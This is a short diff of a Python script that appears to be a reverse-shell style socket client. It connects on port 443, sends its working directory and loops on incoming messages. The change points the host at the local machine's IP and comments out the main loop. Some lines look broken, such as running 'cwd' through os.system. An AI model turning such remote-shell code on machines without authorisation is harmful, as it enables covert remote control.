@@ -3,7 +3,10 @@ import os
 import subprocess
 import sys
 
-Host = sys.argv[0]
+Name = socket.gethostname() #Gets name of Device
+Host = socket.gethostbyname(Name)  #Gets the IPV4 Address of the Device
+
+#get IP Address of Current Machine
 Port = 443
 BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
 # separator string for sending 2 messages in one go
@@ -18,6 +21,8 @@ cwd = 'cwd'
 os.system(cwd)
 
 s.send(cwd.encode())
+
+"""
 
 while True:
 
@@ -48,3 +53,4 @@ while True:
 
 # close client connection
 s.close()
+"""
